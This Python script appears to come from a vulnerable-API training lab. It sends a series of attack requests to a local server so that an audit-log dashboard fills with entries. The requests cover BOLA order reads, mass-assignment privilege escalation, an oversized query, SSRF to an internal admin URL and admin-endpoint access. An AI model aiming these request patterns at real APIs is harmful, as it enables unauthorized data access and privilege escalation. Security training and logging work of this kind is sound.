#!/usr/bin/env python
"""
Generate some exploit log entries for the audit trail.
"""
import requests
import json

BASE = 'http://localhost:5000'

print("🎯 Triggering exploit attempts to populate audit logs...\n")

# 1. Login as Alice
print("1. Login as Alice...")
alice_resp = requests.post(f'{BASE}/api/auth/login', 
    json={'email': 'alice.jones@example.com', 'password': 'AlicePass1!'})
alice_token = alice_resp.json()['access_token']
alice_id = alice_resp.json()['user']['id']
print(f"   ✓ Alice logged in (ID: {alice_id})")

# 2. BOLA: Try to read multiple orders
print("\n2. BOLA: Attempting to read other users' orders...")
for order_id in [1, 3, 4]:
    try:
        resp = requests.get(f'{BASE}/api/orders/{order_id}', 
            headers={'Authorization': f'Bearer {alice_token}'})
        print(f"   ✓ Read order {order_id}: {resp.status_code}")
    except: pass

# 3. Mass Assignment: Try to escalate privileges
print("\n3. Mass Assignment: Attempting privilege escalation...")
try:
    resp = requests.patch(f'{BASE}/api/users/1', 
        json={'is_admin': True},
        headers={'Authorization': f'Bearer {alice_token}'})
    print(f"   ✓ Attempted mass assignment: {resp.status_code}")
except: pass

# 4. Resource Exhaustion: Large limit request
print("\n4. Resource Exhaustion: Requesting large dataset...")
try:
    resp = requests.get(f'{BASE}/api/products?limit=99999&offset=0',
        headers={'Authorization': f'Bearer {alice_token}'})
    print(f"   ✓ Large limit request: {resp.status_code}")
except: pass

# 5. SSRF: Try to fetch internal URL
print("\n5. SSRF: Attempting server-side request forgery...")
try:
    resp = requests.post(f'{BASE}/api/utils/fetch-url',
        json={'url': 'http://127.0.0.1:5000/api/admin/users'},
        headers={'Authorization': f'Bearer {alice_token}'})
    print(f"   ✓ SSRF attempt: {resp.status_code}")
except: pass

# 6. Function-level auth bypass: Try admin endpoint
print("\n6. Function-level auth bypass: Accessing admin endpoints...")
try:
    resp = requests.get(f'{BASE}/api/admin/users',
        headers={'Authorization': f'Bearer {alice_token}'})
    print(f"   ✓ Admin endpoint access attempt: {resp.status_code}")
except: pass

print("\n✅ Exploit simulation complete - audit logs now populated!")
print("\n📋 Switch to the '🔒 AUDIT LOGS' tab in the dashboard to see recorded events.")
